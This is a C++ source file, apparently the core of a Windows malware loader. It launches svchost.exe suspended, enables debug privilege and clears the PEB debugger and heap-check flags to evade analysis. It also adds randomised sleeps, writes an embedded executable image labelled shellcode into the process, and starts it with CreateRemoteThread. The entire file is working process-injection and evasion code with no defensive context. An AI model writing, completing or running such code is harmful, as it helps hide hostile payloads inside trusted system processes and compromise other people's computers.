#include "../process/process.hpp"
#include <iostream>
#include <memory>
#include <windows.h>
#include <winternl.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
#define FLG_HEAP_ENABLE_FREE_CHECK 0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40

auto main() -> int {
    constexpr auto exe_path{R"(C:\Windows\System32\svchost.exe)"};

    // Parse headers and validate the NT header
    auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(raw_bytes);
    auto nt_header = process::get_nt_header(dos_header);
    if (!process::is_valid_nt_header(nt_header)) {
        std::cerr << "Invalid NT header" << std::endl;
        return 1;
    }

    // Load ntdll.dll and kernel32.dll
    auto nt_dll = process::load_ntdll();
    HMODULE kernel32_dll = LoadLibraryA("kernel32.dll");

    // Get the NtQueryInformationProcess, CreateProcessA, and VirtualAllocEx functions
    auto nt_query_info_process = process::get_nt_query_info_process(*nt_dll);
    CreateProcessA_t create_process = reinterpret_cast<CreateProcessA_t>(GetProcAddress(kernel32_dll, "CreateProcessA"));
    VirtualAllocEx_t virtual_alloc_ex = reinterpret_cast<VirtualAllocEx_t>(GetProcAddress(kernel32_dll, "VirtualAllocEx"));

    if (!nt_dll || !kernel32_dll) {
        std::cerr << "Failed to load required libraries" << std::endl;
        return 1;
    }

    if (!nt_query_info_process.has_value() || !create_process || !virtual_alloc_ex) {
        std::cerr << "Failed to get required functions" << std::endl;
        FreeLibrary(kernel32_dll);
        FreeLibrary(*nt_dll);
        return 1;
    }

    if (!util::enable_debug_privilege()) {
        std::cerr << "Failed to enable debug privilege" << std::endl;
        return 1;
    }
    
    unsigned int sleep_duration = util::generate_random_sleep_duration(100, 500);
    Sleep(sleep_duration);

    // Create a suspended process
    auto process_info = process::create_suspended_process(exe_path);
    if (!process_info) {
        std::cerr << "Failed to create process" << std::endl;
        FreeLibrary(*nt_dll);
        return 1;
    }

    sleep_duration = util::generate_random_sleep_duration(100, 500);
    Sleep(sleep_duration);

    // Print the process ID
    std::cout << "Injected process ID: " << process_info->dwProcessId << std::endl;

    // Query process information
    ULONG ret_length;
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status = nt_query_info_process.value()(
            process_info->hProcess,
            ProcessBasicInformation,
                &pbi,
                sizeof(PROCESS_BASIC_INFORMATION),
                &ret_length);

    if (!NT_SUCCESS(status)) {
        std::cerr << "NtQueryInformationProcess failed with status: " << status << std::endl;
    }

        // Manipulate PEB
    PPEB peb = pbi.PebBaseAddress;
    PEB manipulated_peb = *peb;
    manipulated_peb.BeingDebugged = 0; // Set BeingDebugged flag to 0
    auto *nt_global_flag = reinterpret_cast<DWORD *>(reinterpret_cast<PBYTE>(&manipulated_peb) + 0x68);
    *nt_global_flag &= ~FLG_HEAP_ENABLE_TAIL_CHECK;  // Clear heap tail-check flag
    *nt_global_flag &= ~FLG_HEAP_ENABLE_FREE_CHECK;  // Clear heap free-check flag
    *nt_global_flag &= ~FLG_HEAP_VALIDATE_PARAMETERS; // Clear heap validate parameters flag

    sleep_duration = util::generate_random_sleep_duration(100, 500);
    Sleep(sleep_duration);

    // Write the manipulated PEB back to the target process
    if (!process::write_process_memory(process_info->hProcess, peb, &manipulated_peb, sizeof(PEB))) {
        std::cerr << "Failed to write manipulated PEB to target process" << std::endl;
    }

    sleep_duration = util::generate_random_sleep_duration(100, 500);
    Sleep(sleep_duration);

    // Allocate memory in the target process
    auto new_image_base = process::allocate_memory_in_target_process(process_info->hProcess, nt_header->OptionalHeader.SizeOfImage).value_or(nullptr);

    if (!new_image_base) {
        std::cerr << "Failed to allocate memory in target process" << std::endl;
    }

    // Print the memory address of the shellcode
    std::cout << "Shellcode memory address: " << new_image_base << std::endl;

    // Write headers and sections to the target process
    if (!process::write_process_memory(process_info->hProcess, new_image_base, raw_bytes, nt_header->OptionalHeader.SizeOfHeaders)) {
        std::cerr << "Failed to write process memory" << std::endl;
    }

    auto section_header = process::get_section_header(dos_header);
    process::write_sections(section_header, new_image_base, nt_header, process_info->hProcess);

    // Update the image base address in the target process
    auto image_base_addr = reinterpret_cast<PVOID64>(pbi.PebBaseAddress);

    if (!process::write_process_memory(process_info->hProcess, image_base_addr, &new_image_base, sizeof(new_image_base))) {
        std::cerr << "Failed to write process memory" << std::endl;
    }

    sleep_duration = util::generate_random_sleep_duration(100, 500);
    Sleep(sleep_duration);

    // Create and manage remote thread
    HANDLE new_thread = CreateRemoteThread(process_info->hProcess, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(reinterpret_cast<ULONG_PTR>(new_image_base) + nt_header->OptionalHeader.AddressOfEntryPoint), nullptr, CREATE_SUSPENDED, nullptr);

    if (!new_thread) {
        std::cerr << "Failed to create remote thread" << std::endl;
    }

    sleep_duration = util::generate_random_sleep_duration(100, 500);
    Sleep(sleep_duration);

    ResumeThread(new_thread);
    SuspendThread(process_info->hThread);

    std::string_view _exe_path_str(exe_path);
    size_t last_backslash_pos = _exe_path_str.find_last_of('\\');
    std::string_view process_exe = _exe_path_str.substr(last_backslash_pos + 1);
    std::cout << "successfully injected inside " << process_exe << std::endl;
        
    FreeLibrary(kernel32_dll);
    FreeLibrary(*nt_dll);
}